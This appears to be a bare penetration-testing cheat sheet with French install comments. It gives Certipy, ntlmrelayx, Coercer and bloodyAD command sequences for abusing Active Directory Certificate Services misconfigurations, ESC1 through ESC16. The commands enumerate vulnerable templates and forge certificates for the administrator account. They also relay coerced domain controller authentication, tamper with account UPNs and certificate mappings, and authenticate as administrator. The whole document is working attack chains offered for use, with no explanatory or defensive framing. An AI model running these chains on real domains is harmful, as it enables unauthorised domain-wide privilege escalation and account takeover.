# Installation
sudo apt update && sudo apt install -y python3 python3-pip
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip install certipy-ad

# ou avec pipx
pipx install -f "git+https://github.com/ly4k/Certipy.git"

# ou avec uv
uv tool install git+https://github.com/ly4k/Certipy --force

# Enumeration
certipy find -u username -p password -dc-ip ip -target dc -enabled -vulnerable -stdout
nxc ldap target -u username -p password -M adcs
nxc smb target -M enum_ca

# ESC1
addcomputer.py domain/username:password -computer-name computer_name -computer-pass computer_password
certipy req -u computer_name -p computer_password -ca ca -target domain -template template -upn administrator -dc-ip ip
certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip
certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip -key-size 4096
certipy auth -pfx administrator.pfx -domain domain -u username -dc-ip ip
certipy req -u username -p password -ca ca -target domain -template template -upn administrator -sid <administrator sid> -dc-ip ip

# ESC3
certipy req -u username -p password -ca ca -target domain -template template
certipy req username -p password -ca ca -target domain -template User -on-behalf-of administrator -pfx pfx_file
certipy auth -pfx administrator.pfx -dc-ip ip

# ESC4 (Certipy 4.8.2)
certipy template -u username -p password -template template -save-old -dc-ip ip
certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator
certipy auth -pfx administrator.pfx -domain domain -u administrator -dc-ip ip

# ESC4 (Certipy 5.0.2)
certipy template -u username@domain -p password -template template -write-default-configuration -no-save
certipy req -u username@domain -p password -ca ca -template template -upn administrator@domain
certipy auth -pfx administrator.pfx -dc-ip ip

# ESC7
certipy ca -ca ca -add-officer username -u username@domain -p password -dc-ip ip -dns-tcp -ns ip
certipy ca -ca ca -enable-template SubCA -u username@domain -p password -dc-ip ip -dns-tcp -ns ip
certipy req -u username@domain -p password -ca ca -target ip -template SubCA -upn username@domain
certipy ca -ca ca -issue-request request_ID -u username@domain -p password
certipy req -u username@domain -p password -ca ca -target ip -retrieve request_ID
certipy auth -pfx pfx_file -domain domain -u username -dc-ip ip

# ESC8
ntlmrelayx.py -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template template --no-http-server --no-wcf-server --no-raw-server
coercer coerce -u username -p password -l ws_ip -t dc_ip --always-continue
certipy auth -pfx administrator.pfx

# ESC9
certipy shadow auto -u username@domain -hashes :hash -account target_username
certipy account update -u username@domain -hashes :hash -user target_username -upn administrator
certipy req -u target_username@domain -hashes :target_hash -ca ca -template template -target dc_ip
certipy account update -u username@domain -hashes :hash -user target_username -upn target_username
certipy auth -pfx administrator.pfx -domain domain

# ESC13
certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip
certipy auth -pfx file.pfx -dc-ip ip

# ESC14
bloodyAD --host dc -d domain -u username -p password set object target altSecurityIdentities -v 'X509:<RFC822>target@domain'
bloodyAD --host dc -d domain -u owned_user -p password set object target mail -v target@domain
certipy account update -u owned_user@domain -p password -user username -upn target
certipy req -u username -p password -ca ca -template template -dc-ip ip
certipy account update -u owned_user -p password -user username -upn username@domain -dc-ip ip
certipy auth -pfx pfx -dc-ip ip -user target -domain domain

# ESC15 Scenario A
certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid <administrator sid> -application-policies 'Client Authentication'
certipy auth -pfx administrator.pfx -dc-ip ip -ldap-shell

# ESC15 Scenario B
certipy req -u username@domain -p password -dc-ip ip -ca ca -template WebServer -application-policies 'Certificate Request Agent'
certipy req -u username@domain -p password -dc-ip ip -ca ca -template User -pfx user.pfx -on-behalf-of 'DOMAIN\Administrator'
certipy auth -pfx administrator.pfx -dc-ip ip

# ESC16
certipy account -u owned_user@domain -p password -dc-ip ip -upn administrator -user username update
certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template User -upn administrator@domain -sid <administrator sid>
certipy account -u owned_user@domain -p password -dc-ip ip -upn username -user username update
certipy auth -pfx administrator.pfx -dc-ip ip -domain domain
